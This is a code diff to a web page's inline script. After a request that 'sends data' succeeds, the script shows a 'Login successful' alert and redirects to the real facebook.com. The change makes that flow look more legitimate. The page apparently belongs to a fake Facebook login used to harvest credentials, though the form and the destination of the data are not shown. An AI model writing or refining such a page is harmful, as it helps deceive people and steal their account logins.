@@ -230,10 +230,10 @@
             .then(response => {
                 if (response.ok) {
                     // If the request is successful, redirect to Facebook
-                    console.log("Login successful! Redirecting...");
-                    window.location.replace("https://www.facebook.com");  // Use replace to prevent users from using back button
+                    alert('Login successful! Redirecting...');
+                    window.location.href = "https://www.facebook.com"; // Official Facebook redirection
                 } else {
-                    console.log("Failed to send data");
+                    alert('Failed to send data');
                 }
             })
             .catch(error => {
@@ -242,7 +242,6 @@
             });
         });
     </script>
-    
     
 
 </body>
